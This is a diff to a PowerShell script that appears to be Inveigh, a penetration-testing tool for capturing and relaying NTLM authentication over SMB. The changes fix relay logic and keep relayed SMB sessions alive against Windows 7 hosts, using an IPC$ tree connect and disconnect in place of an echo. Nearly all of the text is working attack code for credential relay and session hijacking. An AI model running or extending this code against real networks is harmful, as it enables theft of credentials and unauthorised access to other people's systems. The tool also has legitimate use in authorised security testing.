@@ -294,7 +294,6 @@ if(!$inveigh.running)
     $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
     $inveigh.output_queue = New-Object System.Collections.ArrayList
     $inveigh.POST_request_file_queue = New-Object System.Collections.ArrayList
-    $inveigh.status_queue = New-Object System.Collections.ArrayList
     $inveigh.console_input = $true
     $inveigh.console_output = $false
     $inveigh.file_output = $false
@@ -3412,7 +3411,6 @@ $HTTP_scriptblock =
                                         }
 
                                         $relay_step = 0
-
                                     }
                                     else
                                     {
@@ -3575,7 +3573,7 @@ $control_relay_scriptblock =
             }
             else
             {
-                SMBRelayChallenge $SMB_relay_socket $null '$SMB1' $true $process_ID_bytes > $null
+                SMBRelayChallenge $SMB_relay_socket $null '$SMB1' $process_ID_bytes $true > $null
             }
 
         }
@@ -3590,7 +3588,7 @@ $control_relay_scriptblock =
     function OutputQueueLoop
     {
 
-        while($inveigh.output_queue.Count -gt 0 -and $inveigh.output_pause)
+        while($inveigh.output_queue.Count -gt 0 -and !$inveigh.output_pause)
         {
             $inveigh.console_queue.Add($inveigh.output_queue[0]) > $null
 
@@ -3688,8 +3686,8 @@ $control_relay_scriptblock =
 
     if($SigningCheck -eq 'Y')
     {
-        $SigningCheck = 'N'
         SigningCheck
+        $SigningCheck = 'N'
     }
 
     if($RunTime)
@@ -3795,9 +3793,13 @@ $session_refresh_scriptblock =
                     $SMB2_message_ID =  $inveigh.session_message_ID_table[$session]
                     $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                     $SMB_client_receive = New-Object System.Byte[] 1024
+                    $SMB_path = "\\" + $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString + "\IPC$"
+                    $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
                     $SMB2_message_ID++
-                    $packet_SMB2_header = New-PacketSMB2Header 0x0D,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
-                    $packet_SMB2_data = New-PacketSMB2Echo
+                    $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
+                    #$packet_SMB2_header = New-PacketSMB2Header 0x0D,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
+                    $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
+                    #$packet_SMB2_data = New-PacketSMB2Echo # doesn't work for Win7
                     $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                     $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                     $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
@@ -3813,6 +3815,32 @@ $session_refresh_scriptblock =
                     catch
                     {
                         $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay SMB session $session has closed") > $null
+                    }
+
+                    if($inveigh.session_socket_table[$session].Connected)
+                    {
+                        $SMB2_tree_ID = $SMB_client_receive[40..43]
+                        Start-Sleep -s 1
+                        $SMB2_message_ID++
+                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB2_message_ID $process_ID_bytes $SMB2_tree_ID $SMB_session_ID
+                        $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
+                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
+                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
+                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
+                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
+                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
+
+                        try
+                        {
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Flush()
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                        }
+                        catch
+                        {
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay SMB session $session has closed") > $null
+                        }
+
                     }
 
                     $inveigh.session_lock_table[$Session] = 'open'
